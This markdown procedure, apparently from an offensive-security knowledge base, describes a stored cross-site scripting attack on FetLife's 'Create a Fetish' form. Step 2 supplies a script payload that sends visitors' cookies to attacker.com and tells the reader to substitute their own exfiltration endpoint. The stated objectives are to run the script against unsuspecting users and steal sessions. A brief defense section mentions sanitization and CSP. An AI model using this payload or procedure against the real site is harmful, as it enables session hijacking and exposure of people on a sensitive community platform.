---
id: proc-uuid-1
tags:
  - xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-04T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:55:37.811Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Malicious-Payload-into-Fetish-Name

## Summary

This procedure exploits insufficient input sanitization in FetLife's 'Create a Fetish' section by injecting a malicious JavaScript payload into the fetish name field, allowing it to be stored persistently in the database for later execution against other users.

## Description

In the context of FetLife, a social platform for kink communities, the 'fetish' field during fetish creation lacks proper sanitization, enabling attackers to store arbitrary JavaScript. This payload remains dormant until a victim interacts with it by adding it to their profile and editing settings, at which point it executes in the victim's browser. Prerequisites include a valid FetLife account. Expected outcomes include successful payload storage, verifiable by checking the fetish directory.

## Requirements

1. Registered FetLife user account with creation permissions
2. Web browser for manual interaction
3. Knowledge of XSS payloads (e.g., for cookie theft)

## Defense

Defensive measures and detection strategies:

- Implement server-side input sanitization and output encoding (e.g., HTML entity escaping) for user-generated content
- Deploy Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript execution in browser logs or via WAF rules detecting common XSS patterns

## Objectives

1. Persist malicious JavaScript in the platform's database via the fetish field
2. Set up conditions for client-side execution against unsuspecting users
3. Enable potential data exfiltration or session manipulation

## Instructions

### Step 1: Access Create Fetish Section

**Context**: Log in and navigate to the fetish creation interface to prepare for payload injection.

Navigate to https://fetlife.com/fetishes/new (or equivalent path) and ensure you are authenticated.

### Step 2: Inject and Submit Payload

**Context**: Enter the malicious payload in the name field to bypass sanitization and store it.

In the 'fetish' name field, input: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>` (replace with your exfiltration endpoint), then complete any required fields and submit the form.

> This command is manual browser interaction; expected output is a success message confirming fetish creation, with the payload retrievable from the fetish list.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]
